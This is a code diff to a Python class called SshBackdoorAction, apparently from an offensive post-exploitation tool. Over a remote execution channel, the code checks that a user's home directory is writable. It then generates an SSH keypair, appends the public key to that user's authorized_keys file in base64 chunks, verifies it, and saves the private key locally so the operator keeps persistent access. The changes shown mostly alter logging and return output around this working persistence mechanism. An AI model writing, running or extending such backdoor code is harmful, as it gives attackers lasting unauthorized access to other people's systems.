@@ -62,9 +62,7 @@ class SshBackdoorAction(BaseAction):
             return f"⚠️ User '{user}' not found in /etc/passwd."
 
         # Test if home directory is writable
-        test_write = self._executor.remote_execute(
-            f"test -w {home} && echo O || echo N"
-        )
+        test_write = self._executor.remote_execute(f"test -w {home} && echo O||echo N")
         if not test_write or "O" not in test_write:
             return f"⚠️ User '{user}' home directory is not writable: {home}"
 
@@ -91,6 +89,9 @@ class SshBackdoorAction(BaseAction):
                 format=serialization.PublicFormat.OpenSSH,
             ).decode()
 
+            # Display public key for user
+            logger.info(f"🔑 Public key: {public_key_ssh.strip()}")
+
             logger.success("✅ SSH keypair generated")
         except Exception as e:
             return f"❌ Failed to generate SSH keypair: {e}"
@@ -113,24 +114,29 @@ class SshBackdoorAction(BaseAction):
             chunk_b64 = base64.b64encode(chunk.encode()).decode()
             self._executor.remote_execute(f"echo {chunk_b64}|base64 -d >> {auth_keys}")
 
-        # Add newline after key
+        # Mandatory or it will fail
         self._executor.remote_execute(f"echo >> {auth_keys}")
 
         # Set final permissions
         self._executor.remote_execute(f"chmod 600 {auth_keys}")
+
+        logger.success(f"🔑 Public key injected into {auth_keys}")
+
+        # Verify the key was properly added
+        verify_key = self._executor.remote_execute(f"cat {auth_keys}")
+        if pubkey_clean in verify_key:
+            logger.success("✅ Public key confirmed in authorized_keys")
+        else:
+            logger.warning("⚠️ Public key not found in authorized_keys")
+            return "❌ Failed to verify public key in authorized_keys"
 
         # Save private key locally
         local_save_path = Path.cwd() / "id_ed25519"
         try:
             local_save_path.write_text(private_key_pem)
             local_save_path.chmod(0o600)
-            logger.success(f"💾 Private key saved locally: {local_save_path}")
+            logger.info(f"💾 Private key saved locally: {local_save_path}")
         except Exception as e:
             return f"❌ Failed to save private key locally: {e}"
 
-        # Step 4: Report
-        output = f"🔐 SSH public key added: {auth_keys}\n"
-        output += f"🔑 Public key: {public_key_ssh.strip()}\n"
-        output += f"💾 Private key saved locally: {local_save_path}"
-
-        return output
+        return ""
